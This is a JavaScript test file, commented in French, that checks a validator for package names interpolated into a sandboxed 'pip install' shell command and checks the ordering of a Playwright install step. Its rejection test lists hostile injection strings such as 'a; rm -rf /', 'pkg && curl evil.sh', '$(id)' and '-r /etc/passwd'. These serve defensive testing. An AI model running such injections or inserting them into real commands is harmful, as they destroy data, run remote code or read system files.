import { describe, it, expect } from 'vitest'
import { readFileSync } from 'node:fs'
import { PAQUET_VALIDE } from './e2b-runner.js'

/**
 * Un nom de paquet finit dans un shell. C'est une frontière de sécurité.
 *
 * POURQUOI CE FICHIER EXISTE
 *
 * Le 11 septembre 2026, `spawnJob` a gagné une option `paquets: []` pour que
 * `widget_qa` puisse installer Playwright et vérifier que la bulle de chat
 * s'AFFICHE, au lieu de se contenter de chercher une balise dans le HTML.
 *
 * Ces noms sont interpolés dans `pip install …`, exécuté par un shell dans le
 * bac à sable. L'appelant est notre propre code aujourd'hui — mais une liste
 * qui viendrait d'ailleurs demain (un réglage marchand, une réponse d'API)
 * exécuterait ce qu'elle veut. Une frontière qui ne tient que par la
 * discipline de l'appelant n'est pas une frontière.
 *
 * Le bac à sable est jetable et sans données du marchand, donc le pire cas
 * reste borné. Ce n'est pas une raison de laisser la porte ouverte : il porte
 * quand même SUPABASE_SERVICE_KEY dans son environnement.
 */

describe('noms de paquets acceptés dans un pip install', () => {
  it('accepte ce qui ressemble à un paquet', () => {
    for (const bon of ['requests', 'playwright==1.48.0', 'python-dotenv==1.0.1',
                       'uvicorn[standard]', 'ruamel.yaml', 'pydantic==2.9.2']) {
      expect(PAQUET_VALIDE.test(bon), `${bon} devrait passer`).toBe(true)
    }
  })

  it('refuse tout ce qui pourrait devenir une seconde commande', () => {
    const attaques = [
      'a; rm -rf /',            // enchaînement
      'pkg && curl evil.sh',    // enchaînement conditionnel
      'pkg | sh',               // tube
      '$(id)',                  // substitution de commande
      '`id`',                   // substitution, ancienne forme
      'pkg\nrm -rf /',          // saut de ligne
      '--index-url=http://x',   // détournement de dépôt
      '-r /etc/passwd',         // lecture de fichier
      '../../../etc/passwd',    // chemin
      'pkg name',               // espace : deux arguments
      '',                       // vide
      'https://x/evil.tar.gz',  // installation depuis une URL
    ]
    for (const mauvais of attaques) {
      expect(PAQUET_VALIDE.test(mauvais), `${JSON.stringify(mauvais)} devrait être refusé`).toBe(false)
    }
  })
})

const RUNNER = readFileSync('api/lib/e2b-runner.js', 'utf8')
  .replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '')

describe('l’installation lourde ne bloque pas Vercel', () => {
  it('seuls les paquets validés atteignent la commande', () => {
    // La liste brute ne doit jamais être interpolée : c'est `paquetsSurs`,
    // filtré par PAQUET_VALIDE, qui part dans le shell.
    expect(RUNNER, 'la liste brute `paquets` est interpolée sans filtrage')
      .not.toMatch(/pip install[^`\n]*\$\{paquets\.join/)
    expect(RUNNER).toMatch(/paquetsSurs\.join/)
  })

  it('Chromium s’installe en arrière-plan, pas avant le retour de Vercel', () => {
    // Le piège : l'installation bloquante tient dans les 60 s de la fonction
    // Vercel parce qu'elle ne pose que trois petits paquets. Y ajouter
    // Playwright ferait expirer la fonction AVANT que le script démarre — le
    // travail n'existerait jamais, et rien n'indiquerait pourquoi.
    const posBloquante = RUNNER.indexOf('const installCmd')
    const posNavigateur = RUNNER.indexOf('playwright install')
    expect(posNavigateur, 'l’installation du navigateur a disparu').toBeGreaterThan(0)
    expect(posNavigateur, 'Playwright est installé dans l’étape BLOQUANTE : la '
      + 'fonction Vercel expirera avant le démarrage du script')
      .toBeGreaterThan(posBloquante)
    expect(RUNNER, 'l’étape bloquante installe autre chose que les trois paquets de base')
      .toMatch(/const installCmd = \[\s*'pip install -q --no-input',/)
  })

  it('le script démarre même si une installation échoue', () => {
    // Sinon un `playwright install` raté laisse un travail muet jusqu'au chien
    // de garde. Un script qui démarre sans sa dépendance peut, lui, se rabattre
    // sur la méthode dégradée — et le dire.
    expect(RUNNER, 'les étapes d’installation ne tolèrent pas l’échec (`|| true`)')
      .toMatch(/playwright install[^\n]*\|\| true/)
    expect(RUNNER).toMatch(/pip install -q --no-input \$\{paquetsSurs\.join\(' '\)\} \|\| true/)
  })
})
